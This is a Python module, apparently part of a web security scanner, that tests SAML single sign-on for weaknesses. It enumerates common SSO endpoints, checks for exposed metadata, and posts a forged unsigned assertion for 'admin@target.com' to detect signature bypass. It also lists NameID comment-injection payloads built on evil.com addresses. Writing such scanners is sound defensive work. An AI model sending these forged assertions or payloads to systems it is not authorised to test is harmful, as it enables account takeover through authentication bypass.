"""
SAML Attack Tester
Tests for SAML authentication bypass vulnerabilities
"""

from typing import Dict, List, Optional
from urllib.parse import urlparse, urljoin
from utils.logger import get_logger

logger = get_logger(__name__)


class SAMLTester:
    """Test for SAML authentication vulnerabilities."""

    SAML_ENDPOINTS = [
        '/saml', '/saml/login', '/saml/acs', '/saml/sso',
        '/sso', '/sso/login', '/sso/saml',
        '/adfs/ls', '/adfs/services/trust',
        '/simplesaml', '/simplesaml/module.php/saml/sp/saml2-acs.php',
        '/auth/saml', '/auth/sso',
        '/metadata', '/saml/metadata', '/federationmetadata/2007-06/federationmetadata.xml',
    ]

    COMMENT_INJECTION_PAYLOADS = [
        'admin@evil.com<!---->',
        'admin<!--.-->@evil.com',
        'user@legit.com<!---->@evil.com',
    ]

    def __init__(self, http_client, config: Dict):
        self.http_client = http_client
        self.config = config

    def scan(self, url: str, context: Optional[Dict] = None) -> List[Dict]:
        """Scan for SAML vulnerabilities."""
        vulnerabilities = []
        parsed = urlparse(url)
        base_url = f"{parsed.scheme}://{parsed.netloc}"

        # Detect SAML endpoints
        saml_endpoints = self._detect_saml_endpoints(base_url)

        for endpoint in saml_endpoints:
            # Check for exposed metadata
            vulns = self._check_metadata_exposure(endpoint)
            vulnerabilities.extend(vulns)

            # Check for signature validation issues
            vulns = self._check_signature_bypass(endpoint)
            vulnerabilities.extend(vulns)

        return vulnerabilities

    def _detect_saml_endpoints(self, base_url: str) -> List[str]:
        """Detect active SAML endpoints."""
        found = []
        for path in self.SAML_ENDPOINTS:
            url = urljoin(base_url, path)
            try:
                response = self.http_client.get(url)
                if response and response.status_code in (200, 302, 401, 403):
                    found.append(url)
            except Exception:
                pass
        return found

    def _check_metadata_exposure(self, url: str) -> List[Dict]:
        """Check for exposed SAML metadata with signing certificates."""
        vulnerabilities = []
        metadata_paths = ['/metadata', '/saml/metadata', '/federationmetadata/2007-06/federationmetadata.xml']

        parsed = urlparse(url)
        base = f"{parsed.scheme}://{parsed.netloc}"

        for path in metadata_paths:
            meta_url = urljoin(base, path)
            try:
                response = self.http_client.get(meta_url)
                if not response or response.status_code != 200:
                    continue

                indicators = ['X509Certificate', 'EntityDescriptor', 'IDPSSODescriptor', 'SPSSODescriptor']
                for indicator in indicators:
                    if indicator in response.text:
                        vulnerabilities.append({
                            'type': 'SAML Metadata Exposure',
                            'severity': 'medium',
                            'url': meta_url,
                            'parameter': 'metadata endpoint',
                            'payload': 'N/A',
                            'evidence': f'SAML metadata exposed with {indicator}',
                            'description': 'SAML metadata endpoint exposes signing certificates and SSO configuration',
                            'remediation': 'Restrict metadata endpoint access. Rotate signing keys if exposed publicly.'
                        })
                        break
            except Exception as e:
                logger.debug(f"Error checking SAML metadata: {e}")

        return vulnerabilities

    def _check_signature_bypass(self, url: str) -> List[Dict]:
        """Check for SAML signature validation weaknesses."""
        vulnerabilities = []

        # Test with unsigned SAML response (no signature element)
        unsigned_saml = '''<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol">
            <saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">
                <saml:Subject><saml:NameID>admin@target.com</saml:NameID></saml:Subject>
            </saml:Assertion>
        </samlp:Response>'''

        try:
            import base64
            encoded = base64.b64encode(unsigned_saml.encode()).decode()
            response = self.http_client.post(
                url,
                data={'SAMLResponse': encoded},
                headers={'Content-Type': 'application/x-www-form-urlencoded'}
            )

            if response and response.status_code in (200, 302):
                if 'error' not in response.text.lower() and 'invalid' not in response.text.lower():
                    vulnerabilities.append({
                        'type': 'SAML Signature Bypass',
                        'severity': 'critical',
                        'url': url,
                        'parameter': 'SAMLResponse',
                        'payload': 'Unsigned SAML assertion',
                        'evidence': f'Server accepted unsigned SAML response (status {response.status_code})',
                        'description': 'SAML implementation accepts assertions without valid signatures, allowing authentication bypass',
                        'remediation': 'Enforce signature validation on all SAML assertions. Reject unsigned or improperly signed responses.'
                    })
        except Exception as e:
            logger.debug(f"Error testing SAML signature bypass: {e}")

        return vulnerabilities
